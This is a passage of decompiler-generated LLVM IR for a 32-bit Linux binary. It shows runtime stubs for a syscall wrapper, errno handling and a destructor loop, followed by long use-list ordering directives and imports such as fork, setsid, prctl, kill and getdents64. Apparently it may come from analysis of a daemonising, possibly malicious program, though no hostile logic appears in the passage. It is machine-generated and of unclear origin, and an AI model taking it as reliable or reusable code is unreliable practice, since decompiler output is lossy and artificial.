  uselistorder i16 0, { 0, 2, 1, 5, 6, 7, 8, 3, 4 }
  uselistorder i16 8, { 1, 0 }
  uselistorder i32 -256, { 9, 0, 2, 3, 29, 5, 4, 1, 10, 11, 19, 17, 21, 25, 6, 7, 8, 12, 13, 14, 15, 16, 18, 20, 22, 23, 24, 26, 27, 28, 30 }
  uselistorder i8 0, { 23, 24, 36, 35, 20, 21, 22, 11, 13, 14, 15, 16, 17, 18, 4, 19, 12, 29, 1, 25, 30, 31, 27, 28, 32, 26, 33, 0, 34, 2, 3, 10, 5, 6, 7, 8, 9 }
  uselistorder i32 2, { 28, 33, 11, 34, 0, 50, 13, 51, 14, 26, 1, 2, 3, 29, 4, 5, 6, 15, 16, 30, 7, 8, 18, 9, 20, 17, 19, 23, 21, 22, 35, 36, 47, 32, 39, 41, 38, 40, 42, 43, 44, 31, 37, 45, 46, 10, 27, 25, 24, 12, 48, 49 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_805251b, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052519, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_80524bb, { 1, 0 }
  uselistorder label %dec_label_pc_80524a7, { 1, 0 }
}

define i32 @function_8052521(i32 %arg1) local_unnamed_addr {
dec_label_pc_8052521:
  %v0_8052524 = call i32 @function_804fd37()
  %v0_8052529 = load i32, i32* @edx, align 4
  %v4_8052530 = call i32 @function_804fdc2(i32 %v0_8052524, i32 %arg1, i32 %v0_8052529, i32 %v0_8052529)
  ret i32 %v4_8052530

; uselistorder directives
  uselistorder i32* @edx, { 94, 83, 0, 2, 62, 63, 1, 8, 9, 13, 7, 90, 16, 97, 98, 104, 103, 96, 66, 76, 3, 77, 78, 79, 80, 81, 82, 67, 68, 69, 70, 71, 72, 73, 4, 74, 75, 64, 65, 10, 5, 11, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 6, 54, 55, 56, 57, 58, 59, 60, 100, 12, 14, 15, 61, 99, 93, 95, 101, 102, 84, 85, 86, 87, 88, 89, 92, 91, 105 }
}

define i32 @function_8052539() local_unnamed_addr {
dec_label_pc_8052539:
  %v0_8052539 = load i32, i32* @eax, align 4
  %v1_8052539 = add i32 %v0_8052539, 28
  %v2_8052539 = inttoptr i32 %v1_8052539 to i32*
  %v3_8052539 = load i32, i32* %v2_8052539, align 4
  store i32 %v3_8052539, i32* @global_var_80536b8.72, align 8
  %v1_8052542 = add i32 %v0_8052539, 44
  %v2_8052542 = inttoptr i32 %v1_8052542 to i32*
  %v3_8052542 = load i32, i32* %v2_8052542, align 4
  store i32 %v3_8052542, i32* @global_var_80536bc.73, align 4
  ret i32 %v3_8052542

; uselistorder directives
  uselistorder i32 44, { 8, 1, 0, 5, 7, 6, 2, 3, 4 }
  uselistorder i32 28, { 26, 12, 13, 9, 10, 11, 14, 1, 2, 8, 5, 3, 19, 0, 6, 18, 20, 21, 7, 15, 4, 16, 17, 22, 23, 24, 25 }
}

define i32 @function_805254b(i32 %arg1) local_unnamed_addr {
dec_label_pc_805254b:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805254b = load i32, i32* @ebx, align 4
  store i32 %v0_805254b, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_805255e = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_805255e, i32* @global_var_8053158.70, align 8
  %v7_8052569 = icmp ult i32 %v1_805255e, %arg1
  %v1_805256b = icmp eq i1 %v7_8052569, false
  br i1 %v1_805256b, label %dec_label_pc_805257b, label %dec_label_pc_805256d

dec_label_pc_805256d:                             ; preds = %dec_label_pc_805254b
  %v1_805256d = call i32 @function_805021b(i32 %v0_805254b)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_8052575 = inttoptr i32 %v1_805256d to i32*
  store i32 12, i32* %v1_8052575, align 4
  %v0_805257b.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_805257f.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805257b

dec_label_pc_805257b:                             ; preds = %dec_label_pc_805254b, %dec_label_pc_805256d
  %v2_805257f = phi i32 [ %v0_805254b, %dec_label_pc_805254b ], [ %v2_805257f.pre, %dec_label_pc_805256d ]
  %v0_805257b = phi i32 [ 0, %dec_label_pc_805254b ], [ %v0_805257b.pre, %dec_label_pc_805256d ]
  store i32 %v2_805257f, i32* @ebx, align 4
  ret i32 %v0_805257b

; uselistorder directives
  uselistorder i32 %v1_805255e, { 1, 0 }
  uselistorder i32 12, { 42, 19, 20, 14, 15, 16, 7, 51, 52, 53, 54, 55, 56, 57, 43, 44, 45, 46, 47, 48, 49, 50, 8, 9, 10, 11, 12, 13, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 5, 39, 6, 17, 18, 40, 41, 58, 61, 62, 75, 86, 76, 77, 60, 70, 63, 72, 73, 1, 69, 71, 2, 78, 59, 65, 64, 66, 67, 68, 74, 79, 4, 80, 81, 83, 84, 3, 82, 85, 0 }
  uselistorder i32* @global_var_8053158.70, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805257b, { 1, 0 }
}

define i32 @function_8052581() local_unnamed_addr {
dec_label_pc_8052581:
  %v0_8052584 = load i32, i32* @eax, align 4
  %v1_8052586 = sub i32 0, %v0_8052584
  %v1_8052588 = call i32 @function_805021b(i32 ptrtoint (i32* @0 to i32))
  %v2_805258d = inttoptr i32 %v1_8052588 to i32*
  store i32 %v1_8052586, i32* %v2_805258d, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 (i32)* @function_805021b, { 39, 32, 43, 11, 31, 47, 42, 10, 48, 9, 5, 8, 41, 40, 38, 49, 7, 21, 6, 30, 46, 37, 36, 35, 45, 44, 34, 33, 17, 16, 15, 20, 4, 3, 29, 19, 28, 27, 26, 2, 13, 25, 24, 12, 22, 18, 1, 0, 23, 14 }
  uselistorder i32 ptrtoint (i32* @0 to i32), { 0, 1, 2, 3, 4, 5, 6, 12, 13, 14, 15, 16, 17, 18, 19, 20, 7, 21, 8, 9, 10, 22, 23, 24, 25, 26, 11 }
}

define i32 @function_80525a0() local_unnamed_addr {
dec_label_pc_80525a0:
  %stack_var_-16 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-16, align 4
  %v0_80525ac = load i32, i32* @global_var_8053000.57, align 4096
  %v10_80525b1 = icmp eq i32 %v0_80525ac, -1
  br i1 %v10_80525b1, label %dec_label_pc_80525c2, label %dec_label_pc_80525b6.preheader

dec_label_pc_80525b6.preheader:                   ; preds = %dec_label_pc_80525a0
  br label %dec_label_pc_80525b6

dec_label_pc_80525b6:                             ; preds = %dec_label_pc_80525b6.preheader, %dec_label_pc_80525b6
  %v4_80525b9 = phi i32 [ %v0_80525ac, %dec_label_pc_80525b6.preheader ], [ %v2_80525bb, %dec_label_pc_80525b6 ]
  %v0_80525b6 = phi i32 [ ptrtoint (i32* @global_var_8053000.57 to i32), %dec_label_pc_80525b6.preheader ], [ %v1_80525b6, %dec_label_pc_80525b6 ]
  %v1_80525b6 = add i32 %v0_80525b6, -4
  call void @__pseudo_call(i32 %v4_80525b9)
  %v1_80525bb = inttoptr i32 %v1_80525b6 to i32*
  %v2_80525bb = load i32, i32* %v1_80525bb, align 4
  %v10_80525bd = icmp eq i32 %v2_80525bb, -1
  %v1_80525c0 = icmp eq i1 %v10_80525bd, false
  br i1 %v1_80525c0, label %dec_label_pc_80525b6, label %dec_label_pc_80525c2.loopexit

dec_label_pc_80525c2.loopexit:                    ; preds = %dec_label_pc_80525b6
  %v2_80525c2.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_80525c2

dec_label_pc_80525c2:                             ; preds = %dec_label_pc_80525c2.loopexit, %dec_label_pc_80525a0
  %v2_80525c2 = phi i32 [ %v2_80525c2.pre, %dec_label_pc_80525c2.loopexit ], [ %tmp6, %dec_label_pc_80525a0 ]
  ret i32 %v2_80525c2

; uselistorder directives
  uselistorder i32 %v0_80525ac, { 1, 0 }
  uselistorder i1 false, { 123, 51, 70, 71, 73, 72, 0, 52, 53, 54, 34, 35, 134, 135, 136, 137, 139, 11, 140, 141, 138, 133, 124, 21, 126, 127, 128, 2, 129, 130, 131, 132, 1, 62, 63, 64, 65, 66, 67, 56, 57, 58, 59, 60, 61, 55, 22, 23, 24, 25, 26, 27, 28, 29, 30, 36, 37, 38, 39, 5, 40, 41, 10, 43, 42, 46, 44, 45, 6, 12, 47, 48, 125, 31, 3, 32, 33, 92, 93, 14, 49, 50, 68, 81, 82, 94, 4, 88, 74, 95, 96, 15, 83, 84, 16, 85, 86, 89, 17, 78, 79, 90, 97, 7, 69, 75, 8, 76, 77, 80, 87, 91, 98, 99, 18, 100, 19, 122, 101, 102, 103, 104, 105, 106, 107, 9, 108, 109, 110, 111, 112, 113, 114, 115, 121, 116, 119, 117, 118, 120, 142, 20, 13, 143 }
  uselistorder void (i32)* @__pseudo_call, { 1, 3, 4, 5, 6, 2, 0 }
  uselistorder i32 -4, { 8, 9, 10, 11, 50, 52, 53, 54, 4, 51, 1, 49, 12, 38, 5, 39, 40, 41, 6, 0, 2, 3, 42, 43, 44, 45, 46, 47, 48, 7, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i32 ptrtoint (i32* @global_var_8053000.57 to i32), { 1, 3, 4, 0, 5, 6, 2 }
  uselistorder i32 -1, { 22, 23, 0, 83, 161, 47, 84, 15, 48, 85, 49, 86, 50, 87, 51, 88, 52, 89, 53, 90, 54, 91, 55, 92, 56, 93, 16, 17, 6, 5, 57, 58, 94, 59, 95, 60, 96, 24, 1, 97, 46, 61, 98, 162, 8, 9, 99, 7, 100, 25, 150, 26, 101, 148, 28, 29, 18, 13, 30, 62, 31, 102, 27, 149, 3, 103, 104, 19, 20, 21, 105, 10, 12, 32, 2, 63, 146, 147, 155, 156, 64, 151, 33, 65, 106, 66, 107, 67, 108, 44, 45, 109, 68, 110, 69, 111, 70, 112, 71, 113, 72, 114, 73, 115, 74, 116, 75, 117, 76, 118, 77, 119, 78, 120, 79, 121, 80, 122, 81, 123, 34, 154, 4, 11, 124, 157, 152, 38, 125, 36, 41, 126, 42, 127, 37, 43, 128, 158, 35, 129, 130, 131, 132, 133, 153, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 39, 159, 145, 160, 14, 40, 82 }
  uselistorder i32 1, { 156, 157, 40, 100, 101, 296, 0, 297, 102, 335, 158, 27, 26, 28, 159, 48, 47, 46, 160, 4, 161, 162, 29, 164, 163, 30, 165, 16, 166, 39, 167, 76, 168, 50, 169, 63, 170, 62, 171, 86, 172, 173, 18, 17, 19, 117, 53, 175, 174, 177, 176, 6, 178, 5, 180, 179, 51, 181, 185, 184, 183, 182, 56, 336, 337, 338, 188, 187, 186, 92, 93, 91, 103, 189, 192, 191, 190, 59, 104, 150, 255, 118, 193, 151, 196, 195, 194, 75, 119, 291, 292, 293, 197, 49, 286, 287, 105, 288, 289, 290, 11, 9, 10, 96, 285, 120, 64, 65, 66, 67, 121, 106, 256, 257, 258, 259, 200, 199, 198, 14, 13, 12, 15, 122, 201, 7, 8, 124, 262, 263, 264, 265, 266, 267, 268, 269, 270, 123, 271, 272, 273, 274, 275, 107, 276, 277, 94, 108, 278, 279, 280, 281, 109, 110, 282, 283, 284, 204, 203, 202, 45, 41, 42, 44, 43, 111, 112, 205, 113, 114, 209, 208, 207, 206, 37, 125, 152, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 260, 261, 223, 22, 21, 20, 224, 225, 126, 127, 226, 227, 115, 229, 228, 35, 128, 230, 231, 31, 232, 23, 233, 74, 234, 38, 235, 89, 236, 61, 237, 25, 238, 24, 239, 52, 3, 241, 240, 55, 242, 54, 243, 90, 245, 244, 87, 246, 58, 247, 36, 248, 34, 57, 250, 249, 88, 310, 116, 311, 312, 97, 317, 95, 33, 32, 313, 154, 82, 83, 85, 84, 314, 155, 77, 79, 78, 81, 80, 60, 298, 299, 300, 301, 302, 303, 318, 129, 319, 139, 295, 135, 308, 145, 146, 131, 315, 141, 307, 133, 309, 320, 143, 294, 144, 140, 304, 305, 137, 306, 138, 142, 136, 134, 132, 130, 316, 321, 147, 322, 323, 334, 324, 325, 326, 327, 328, 329, 332, 148, 333, 69, 72, 71, 70, 73, 330, 331, 153, 252, 251, 68, 1, 149, 2, 98, 99, 339, 254, 253 }
  uselistorder label %dec_label_pc_80525b6, { 1, 0 }
}

define i32 @function_80525c6() local_unnamed_addr {
entry:
  %v0_80525c9 = load i32, i32* @ebx, align 4
  %v1_80525ca = call i32 @function_80480b0(i32 %v0_80525c9)
  store i32 %v1_80525ca, i32* @eax, align 4
  %v0_80525d5 = call i32 @function_80480c0()
  ret i32 %v0_80525d5

; uselistorder directives
  uselistorder i32* @eax, { 7, 16, 39, 41, 42, 43, 44, 46, 11, 47, 0, 45, 4, 6, 40, 24, 26, 27, 25, 12, 13, 17, 18, 19, 20, 22, 23, 21, 1, 14, 15, 10, 2, 28, 29, 8, 9, 30, 34, 35, 36, 31, 32, 33, 48, 37, 38, 3, 5 }
  uselistorder i32 (i32)* @function_80480b0, { 1, 0 }
  uselistorder i32 0, { 205, 31, 150, 32, 266, 267, 4, 268, 269, 270, 5, 33, 67, 68, 206, 207, 34, 198, 240, 241, 242, 79, 243, 356, 244, 187, 199, 200, 357, 185, 184, 358, 359, 360, 186, 201, 202, 208, 209, 182, 361, 296, 16, 17, 362, 69, 369, 370, 6, 35, 151, 7, 152, 153, 380, 381, 61, 382, 36, 140, 37, 80, 81, 0, 363, 364, 365, 38, 183, 147, 368, 39, 371, 13, 141, 40, 70, 373, 376, 375, 11, 12, 253, 254, 247, 248, 249, 71, 250, 251, 252, 18, 19, 20, 21, 245, 82, 246, 83, 154, 188, 28, 189, 72, 155, 190, 210, 211, 212, 213, 214, 215, 216, 217, 218, 73, 74, 219, 156, 220, 157, 158, 84, 142, 159, 85, 143, 41, 160, 221, 222, 42, 43, 86, 144, 30, 223, 224, 225, 44, 45, 87, 145, 29, 226, 62, 227, 27, 228, 229, 231, 161, 230, 1, 374, 366, 367, 191, 192, 194, 193, 14, 15, 2, 75, 195, 196, 197, 271, 203, 204, 162, 163, 232, 233, 234, 235, 236, 237, 238, 239, 164, 255, 256, 297, 372, 257, 298, 258, 259, 260, 377, 76, 354, 261, 262, 355, 272, 299, 378, 379, 46, 47, 263, 49, 48, 50, 165, 300, 51, 166, 52, 167, 286, 168, 169, 301, 273, 274, 275, 277, 278, 351, 302, 303, 22, 170, 54, 171, 304, 305, 279, 172, 288, 173, 306, 307, 294, 295, 264, 265, 289, 290, 291, 280, 281, 282, 283, 284, 285, 287, 292, 293, 8, 64, 65, 60, 174, 53, 175, 308, 63, 309, 310, 55, 348, 349, 350, 176, 311, 312, 313, 314, 315, 316, 317, 318, 324, 148, 319, 320, 321, 322, 323, 325, 177, 178, 56, 179, 328, 329, 330, 331, 332, 77, 23, 333, 334, 335, 180, 276, 343, 344, 345, 346, 336, 337, 338, 342, 347, 24, 78, 326, 327, 57, 146, 25, 339, 340, 341, 9, 26, 149, 10, 58, 3, 352, 353, 59, 181, 66, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 383, 384, 385, 386, 387, 388, 389, 390 }
  uselistorder i32* @ebx, { 12, 113, 114, 63, 64, 37, 115, 0, 116, 117, 222, 118, 15, 16, 223, 14, 224, 225, 226, 227, 228, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 65, 1, 66, 67, 68, 13, 229, 230, 181, 182, 69, 70, 231, 232, 233, 10, 11, 251, 252, 253, 254, 8, 2, 7, 236, 245, 249, 250, 234, 235, 241, 242, 119, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 122, 123, 3, 124, 125, 120, 121, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 4, 28, 29, 30, 31, 32, 33, 34, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 9, 85, 86, 87, 88, 89, 5, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 239, 240, 35, 36, 56, 57, 58, 59, 60, 61, 62, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 136, 137, 138, 139, 140, 183, 184, 237, 238, 141, 185, 186, 142, 143, 144, 243, 244, 218, 219, 145, 146, 220, 221, 150, 151, 187, 188, 246, 247, 248, 147, 152, 153, 154, 155, 156, 157, 158, 170, 171, 189, 190, 159, 160, 161, 191, 149, 165, 162, 167, 168, 169, 164, 166, 172, 173, 148, 174, 163, 175, 176, 177, 178, 179, 180, 192, 193, 194, 195, 196, 197, 198, 200, 199, 210, 211, 212, 6, 213, 201, 202, 203, 204, 205, 206, 207, 208, 209, 214, 215, 216, 217 }
}

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork(i32) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @getppid(i32) local_unnamed_addr

declare i32 @ioctl(i32, i32, ...) local_unnamed_addr

declare i32 @kill(i32, i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @prctl(i32, i32, i32, i32, i32) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @readlink(i8*, i8*, i32) local_unnamed_addr

declare i32 @setsid(i32) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @unlink(i8*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32* @mmap(i32*, i32, i32, i32, i32, i32) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @fstat(i32, %stat*) local_unnamed_addr

declare i32 @getdents64(i32, %linux_dirent64*, i32) local_unnamed_addr

declare i32* @mremap(i32*, i32, i32, i32, ...) local_unnamed_addr

declare i32 @munmap(i32*, i32) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @times(%tms*) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i16* @__decompiler_undefined_function_2() local_unnamed_addr

declare i16 @__decompiler_undefined_function_3() local_unnamed_addr

declare i8* @__decompiler_undefined_function_4() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_5() local_unnamed_addr

declare i64 @__decompiler_undefined_function_6() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_7() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_8() local_unnamed_addr

declare %tms* @__decompiler_undefined_function_9() local_unnamed_addr

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
